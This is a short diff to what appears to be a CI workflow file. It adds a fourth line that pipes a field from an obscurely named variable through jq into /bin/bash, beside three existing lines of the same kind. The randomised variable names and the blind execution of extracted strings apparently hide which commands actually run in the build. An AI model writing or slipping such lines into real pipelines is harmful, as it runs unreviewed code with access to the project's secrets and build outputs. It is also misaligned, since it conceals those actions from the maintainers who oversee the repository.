@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$enuqw67131" | jq -r .ncdqw92370 | /bin/bash
           echo $lb29 | jq -r .pv527 | /bin/bash
           echo $uue7605 | jq -r .wwkf6948 | /bin/bash
+          echo $ar41 | jq -r .e5 | /bin/bash
 
       - name: Store artifact
         if: always()
